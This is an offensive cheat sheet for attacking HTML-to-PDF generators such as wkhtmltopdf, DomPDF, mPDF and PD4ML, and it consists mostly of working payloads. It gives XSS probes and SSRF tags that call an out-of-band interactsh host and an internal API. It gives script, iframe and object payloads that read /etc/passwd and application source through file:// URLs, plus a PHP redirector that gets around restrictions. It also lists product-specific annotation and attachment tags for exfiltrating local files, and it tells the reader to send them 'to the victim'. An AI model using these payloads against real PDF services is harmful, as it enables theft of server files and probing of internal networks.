**attacking PDF generators**
Here i will try to generate some guides on how to approach and attack PDF generators that have the scope to gnerate from HTML to PDF.


## Affected products?
You might want to check for those apps
```
    TCPDF
    html2pdf
    mPDF
    DomPDF
    PDFKit
    wkhtmltopdf
    PD4ML
```


### XSS test
```
<script>document.write('test1')</script>
```

### Unveil local PATH of the JS
```
<script>document.write(window.location)</script>
```

### SSRF
Setup a ex-filtrate server on: https://app.interactsh.com/
Then you can use wither XSS+SSRF:
```
<img src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest1"/>
```
OR (try directly to reach for a SSRF example internal api)
```
<iframe src="http://127.0.0.1:8080/api/users" width="800" height="500"></iframe>
```

### LFI
Send this to the victim for PDF generations:
```
<script>
	x = new XMLHttpRequest();
	x.onload = function(){
		document.write(this.responseText)
	};
	x.open("GET", "file:///etc/passwd");
	x.send();
</script>
```

IF the tags get broken you can export as B64 encoded with max 100 chars pagination:
```
<script>
	function addNewlines(str) {
		var result = '';
		while (str.length > 0) {
		    result += str.substring(0, 100) + '\n';
			str = str.substring(100);
		}
		return result;
	}
	x = new XMLHttpRequest();
	x.onload = function(){
		document.write(addNewlines(btoa(this.responseText)))
	};
	x.open("GET", "file:///var/www/internal/index.php");
	x.send();
</script>

```
OR (direct via HTML on the PDF)
```
<iframe src="file:///etc/passwd" width="800" height="500"></iframe>
<object data="file:///etc/passwd" width="800" height="500">
<portal src="file:///etc/passwd" width="800" height="500">

```
OR (bypass html restriction via header redirect on file tag)
Host locally:
```
<?php header('Location: file://' . $_GET['url']); ?>
```
Then send to the victim()
```
<iframe src="http://172.17.0.1:8000/redirector.php?url=%2fetc%2fpasswd" width="800" height="500"></iframe>
```

### Extra (specific for some products only)
Some pdf generator supports tags like attachments and annotations which will let you use it for malicious stuffs
```
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="LFI" />
```
OR
```
<pd4ml:attachment src="/etc/passwd" description="LFI" icon="Paperclip"/>
```
